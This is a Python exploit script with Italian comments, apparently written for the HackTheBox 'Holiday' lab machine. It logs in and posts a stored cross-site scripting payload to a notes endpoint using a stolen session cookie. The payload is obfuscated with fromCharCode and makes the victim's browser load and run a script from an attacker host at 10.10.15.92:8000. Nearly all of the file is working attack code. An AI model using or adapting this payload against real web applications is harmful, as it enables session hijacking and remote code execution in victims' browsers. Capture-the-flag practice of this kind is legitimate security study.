import requests
import argparse
import time

# exploit per la macchina Holiday HTB

teschio=[
    "      _____",
    "     /     \\",
    "    | () () |",
    "     \\  ^  /",
    "      |||||",
    "      |||||",
]

for linea in teschio:
    print(linea)
    time.sleep(0.05)
print("\n")

parser=argparse.ArgumentParser(description='exploit per la macchina Holiday HTB')

parser.add_argument("-H","--host",default=None,required=True,help='url del target')
parser.add_argument("-rp","--remote-port",default=80,help='porta del target')
parser.add_argument("-m","--method",default='GET',help='metodo della richiesta: GET,POST,...')
parser.add_argument("-e","--endpoint",default='',help="endpoint del target")
parser.add_argument("-u","--username",help="nome utente")
parser.add_argument("-p","--password",help="password")
parser.add_argument("-c","--cookie",default=None,help="cookie di sessione")
parser.add_argument("-i","--uuid",help="identificativo del nominativo della prenotazione")

argomenti=parser.parse_args()

url=argomenti.host
porta=argomenti.remote_port
metodo=argomenti.method.upper()
endpoint=argomenti.endpoint
nome_utente=argomenti.username
passwd=argomenti.password
cookie_sessione=argomenti.cookie
uuid=argomenti.uuid

target=f"{url}:{porta}/{endpoint}"

# headers NECESSARI
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
}

# payload XSS: document.write('<script src="http://10.10.15.92:8000/holiday.js"></script>'); ---> scritto in charcode
payload=f'<img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,53,46,57,50,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>">'

# ATTENZIONE! L'EXPLOIT RESTITUISCE 200 ANCHE CON CREDENZIALI ERRATE, COMUNICA IL FALLIMENTO 
# TRAMITE LA PAGINA HTML CON UN "INVALID USER" OPPURE "INCORRECT PASSWORD"

try:
    # richiede per forza il cookie valido
    if cookie_sessione is not None and endpoint=="agent/addNote" and metodo=="POST":
        print("[+] caricamento cookie e dati...")
        cookie={
            # cookie di sessione SPECIFICO per la macchina Holiday
            "connect.sid":cookie_sessione
        }
        dati={
            "uuid":uuid,
            "body":payload
        }
        print("[+] invio della richiesta...")
        richiesta=requests.request(method=metodo,url=target,cookies=cookie,data=dati,headers=headers)
        if richiesta.status_code==200:
            print(f"[+] nota aggiunta ad uuid: {uuid}")
        else:
            print("[!] nota non aggiunta, cookie non valido o errore genrico")

    elif endpoint=='login'and metodo=='POST':
        dati_da_inviare={
            "username":nome_utente,
            "password":passwd
        }
        print("[+] invio della richiesta...")
        richiesta=requests.request(method=metodo,url=target,data=dati_da_inviare,headers=headers)
        if richiesta.status_code==200:
            print(f"[+] login eseguito come {nome_utente}")
            print(f"[+] status code: {richiesta.status_code}")
        else:
            print("[!] credenziali errate o errore generico")

    else:
        print("[+] invio della richiesta...")
        richiesta=requests.request(method=metodo,url=target,headers=headers)
        print("[+] richiesta generica eseguita")
        print(f"[+] status code: {richiesta.status_code}")
except:
    print("ERRORE")
